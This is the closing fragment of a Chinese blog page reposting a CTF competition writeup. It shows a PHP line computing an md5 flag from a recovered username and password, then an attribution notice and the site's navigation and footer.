class="line">95e1da8517497ee29e716a2835375eeb</span><br><span class="line">&lt;?phpecho md5(&#x27;webuser:</span><br><span class="line">1q2w3e4r5t6y&#x27;);flag为:</span><br><span class="line">a18b8e2d1a8ee267599b04be62f0a26a</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/173987.html](https://www.ctfiot.com/173987.html)
+> 仓库原文：[CTF大赛WP集合/articles/第二届数据安全大赛暨首届“数信杯”东部赛区writeup.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E9%A6%96%E5%B1%8A%E2%80%9C%E6%95%B0%E4%BF%A1%E6%9D%AF%E2%80%9D%E4%B8%9C%E9%83%A8%E8%B5%9B%E5%8C%BAwriteup.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">非栈上格式化字符串</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Pwn/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-Attack_Lab_%E9%A2%98%E8%A7%A3/" title="《深入理解计算机系统》Attack Lab 题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">《深入理解计算机系统》Attack Lab 题解</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Pwn/%E7%AC%AC%E4%BA%8C%E5%B1%8A-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B-%E9%98%B2%E6%8A%A4%E8%B5%9B-%E6%80%BB%E5%86%B3%E8%B5%9B-Pwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="第二届&quot;长城杯&quot;信息安全铁人三项赛(防护赛)总决赛-Pwn方向部分题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届&quot;长城杯&quot;信息安全铁人三项赛(防护赛)总决赛-Pwn方向部分题解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
